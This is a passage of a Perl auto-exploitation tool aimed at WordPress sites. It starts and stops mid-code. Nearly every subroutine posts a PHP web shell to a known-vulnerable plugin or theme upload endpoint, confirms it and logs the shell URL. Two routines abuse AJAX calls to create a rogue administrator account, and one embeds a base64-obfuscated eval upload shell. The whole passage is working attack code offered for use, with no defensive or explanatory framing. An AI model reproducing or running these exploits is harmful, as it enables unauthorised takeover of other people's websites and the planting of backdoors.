print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Ecstatic Exp";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ woocommerce-custom-t-shirt-designer #####################
sub tst(){ 
my $url = "$site/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-deep-gray/designit/cs/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "./",'uploadfile' => ["files/Izanami.php"] ]);

if ($response->content =~ /(.*?)php/) {
$uploadfolder=$1.'php';
}
$zoomerup="$site/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-white/designit/cs/uploadImage/$uploadfolder";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"custom-t-shirt";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"custom-t-shirt";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
################ ninetofive tema file upload #####################
sub xxcc(){ 
my $url = "$site/wp-content/plugins/wp-simple-cart/request/simple-cart-upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'userfile' => ["files/Izanami.php"] ]);

if ($response->content =~ /files(.*?)temporary/) {
$uploadfolder=$1;
}
$zoomerup="$site//wp-content/plugins/wp-simple-cart/files/$uploadfolder/temporary/Izanami.php?I=Xploit";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"simple-cartexp";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"simple-cartexp";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ ninetofive tema file upload #####################
sub nineto(){ 
my $url = "$site/wp-content/themes/ninetofive/scripts/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'qqfile' => ["files/Izanami.php"] ]);

if ($response->content =~ /uploads%2F(.*?); expires/) {
$uploadfolder=$1.'?I=Xploit';
}
$zoomerup="$site/wp-content/themes/ninetofive/scripts/uploads/$uploadfolder";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Ninetofive Exp";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Ninetofive Exp";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Viral Options #####################
sub viral(){

my $addblockurl = "$site/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/uploads/$year/$month/Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Viral Options";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Viral Options";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}

################ jsor-sliders #####################
sub jsor(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/jssor-slider/jssor-uploads/Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Jsor-Sliders";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
jsordef();
}
}
sub jsordef(){
my $addblockurl = "$site/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["files/Izanami.txt"]]);
$addblockup="$site/wp-content/jssor-slider/jssor-uploads/Izanami.txt";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Jsor-Sliders";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Jsor-Sliders";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}

################ wp-tema #####################
sub wptema(){
my $url = "$site/wp-content/themes/clockstone/theme/functions/uploadbg.php";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "./",'uploadfile' => ["files/Izanami.php"] ]);

$dump = "$site/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php";
if($response->content =~/e3726adb9493beb4e8e2dabe65ea10ef/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"clockstone";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $dump\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$dump\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"clockstone";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Blaze";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $blazeup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Blaze";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Catpro";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $catproup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Catpro";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["files/Izanami.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/Izanami.php?I=Xploit";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Cherry Plugin";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $cherryup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Cherry Plugin";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagerOK="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["files/Izanami.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/Izanami.php?I=Xploit";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Download Manager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $dmup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Download Manager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Download Manager RCE #####################
sub expadd(){

my  $user = "izanami";
my  $pass = "xploit";
my $body = $ua->post( $site,
        Cookie => "",
        Content_Type => 'form-data',
        Content => [action => "wpdm_ajax_call", execute => "wp_insert_user", user_login => $user,
        user_pass => $pass, role => "administrator",]
   );
   my $html =$body->content;
   my $string_len =  length( $html );
   if ($string_len eq 0){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Download Manager RCE";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green'), "[OK] Exploiting Success\n";
print color('bold green'), "[!] login = ".$site."/wp-login.php\n";
print color('bold green'), "[!] User = ".$user."\n";
print color('bold green'), "[!] Pass = ".$pass."\n";
open (TEXT, '>>Result/RCE-WP.txt');
print TEXT "$site/wp-login.php\n","$user\n","$pass\n";
close (TEXT); 
   } 
   elsif ($string_len != 0){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Download Manager RCE";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ wordpress Marketplace Manager RCE #####################
sub expaddd(){

my  $user = "izanami";
my  $pass = "xploit";
my $body = $ua->post( $site,
        Cookie => "",
        Content_Type => 'form-data',
        Content => [action => "wpmp_pp_ajax_call", execute => "wp_insert_user", user_login => $user,
        user_pass => $pass, role => "administrator",]
   );
   my $html =$body->content;
   my $string_len =  length( $html );
   if ($string_len eq 0){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"WP Marketplace RCE";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green'), "[OK] Exploiting Success\n";
print color('bold green'), "[!] login = ".$site."/wp-login.php\n";
print color('bold green'), "[!] User = ".$user."\n";
print color('bold green'), "[!] Pass = ".$pass."\n";
open (TEXT, '>>Result/RCE-WP.txt');
print TEXT "$site/wp-login.php\n","$user\n","$pass\n";
close (TEXT); 
} 
   elsif ($string_len != 0){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"WP Marketplace RCE";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Formcraft #####################
sub formcraft(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $shell ="files/Izanami.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/Izanami.php?I=Xploit";

if ($response->content =~ /{"files/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Formcraft";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $formcraftup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Formcraft";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
################ Formcraft 2#####################
sub formcraft2(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
my $shell ="files/m-a.phtml";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

my $body = $response->content;
my $regex='name":"(.*)","new_name":"(.*?)"';
if($body =~ s/$regex//){
my $out = $1;my $newout=$2;
print "[Name File] $out \n";
print "[New Name] $newout\n";
$formcraft2up="$site/wp-content/plugins/formcraft/file-upload/server/content/files/$newout";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Formcraft2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $formcraft2up\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$formcraft2up\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Formcraft2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
sub xav(){ 
my $url = "$site/resources/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=test.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'multipart/form-data',
        Content => $index
        );

$zoomerup="$site//wp-content/plugins/php-analytics/resources/open-flash-chart/Result-upload-images/test.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"open-flash-chart";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"open-flash-chart";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
################ Catpro #####################
sub izxc(){

my $url = "$site/wp-admin/admin.php?page=dreamwork_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'drm_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/dreamwork\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/dreamwork/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dreamwork";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $catproup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
mdef();
}
}
sub mdef(){ 
my $url = "$site/wp-admin/admin.php?page=dreamwork_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/index.html"], task => 'drm_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/dreamwork\/(.*?)\/big\/index.html/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/dreamwork/$uploadfolder/big/index.html";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dreamwork";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $catproup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dreamwork";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Contact Form 7 #####################
sub con7(){ 
my $url = "$site/wp-admin/admin-ajax.php";
my $field_name = "Filedata";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ "action" => "nm_webcontact_upload_file", $field_name => ["files/Izanami.php"] ]
           
            );

if ($sexycontactres->content =~ /"filename":"(.*?)"}/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/contact_files/$uploadfolder";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Contact Form Menager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Contact Form Menager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ Fuild #####################
sub fuild(){
my $url = "$site/wp-content/plugins/fluid_forms/file-upload/server/php/";
my $shell ="files/Izanami.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$fuildup="$site/wp-content//plugins//fluid_forms/file-upload/server/php/files/Izanami.php?I=Xploit";

if ($response->content =~ /{"files/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"fluid_form";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $fuildup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$fuildup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"fluid_form";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ levoslideshow #####################
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"levoslideshow";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"levoslideshow";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
################ VERTİCAL #####################
sub vertical(){

my $url = "$site/wp-admin/admin.php?page=vertical_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'vrt_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/vertical\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/vertical/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"vertical";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"vertical";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ carousel_manage #####################
sub carousel(){

my $url = "$site/wp-admin/admin.php?page=carousel_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'carousel_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/carousel\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/carousel/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"carousel";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"carousel";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ superb_manage #####################
sub superb(){

my $url = "$site/wp-admin/admin.php?page=superb_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'superb_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/superb\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/superb/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"superb";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"superb";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ yass_manage #####################
sub yass(){

my $url = "$site/wp-admin/admin.php?page=yass_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'yass_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/yass\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/yass/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"yass";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
